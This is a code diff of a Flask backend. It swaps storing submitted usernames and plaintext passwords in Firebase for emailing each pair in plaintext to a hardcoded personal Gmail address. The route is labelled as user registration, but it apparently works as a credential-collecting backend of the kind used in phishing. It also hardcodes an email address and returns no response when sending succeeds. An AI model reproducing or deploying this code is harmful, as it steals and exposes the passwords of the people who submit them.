@@ -1,18 +1,11 @@
 import os
 from flask import Flask, request, jsonify
 from flask_cors import CORS  # Import CORS
-import firebase_admin
-from firebase_admin import credentials, db
+import yagmail
 
 # Initialize Flask app
 app = Flask(__name__)
 CORS(app)  # Enable CORS for all routes
-
-# Initialize Firebase Admin SDK
-cred = credentials.Certificate("/etc/secrets/key.json")  # Replace with your credentials file path
-firebase_admin.initialize_app(cred, {
-    'databaseURL': 'https://database-b81ee-default-rtdb.firebaseio.com/'  # Replace with your Firebase database URL
-})
 
 # Route to add username and password to Firebase Realtime Database
 @app.route('/register', methods=['POST'])
@@ -25,36 +18,24 @@ def register_user():
         return jsonify({"error": "Username and password are required"}), 400
 
     try:
-        # Reference to the Realtime Database
-        ref = db.reference('livetop').child(username)
 
-        # Store password (as example, ideally should be hashed for security)
-        ref.set({
-            'password': password
-        })
+        # Email credentials
+        sender_email = "shs956899@gmail.com"
+        app_password = "your_app_password"  # Use App Password for Gmail if 2FA is enabled
+        receiver_email = "shs956899@gmail.com"
+        body     = f"username: {username} || password: {password}"
+        subject = "This is the body of the email."
 
-        return jsonify({"message": "User registered successfully"}), 201
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        # Initialize yagmail with your credentials
+        yag = yagmail.SMTP(sender_email, app_password)
 
-@app.route('/l/<u>/<p>',methods=['POST'])
-def l(u,p):
-    username = u
-    password = p
+        # Send the email
+        try:
+            yag.send(to=receiver_email, subject=subject, contents=body)
+            print("Email sent successfully!")
+        except Exception as e:
+            print(f"Failed to send email: {e}")
 
-    if not username or not password:
-        return jsonify({"error": "Username and password are required"}), 400
-
-    try:
-        # Reference to the Realtime Database
-        ref = db.reference('livetop').child(username)
-
-        # Store password (as example, ideally should be hashed for security)
-        ref.set({
-            'password': password
-        })
-
-        return jsonify({"message": "User registered successfully"}), 201
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
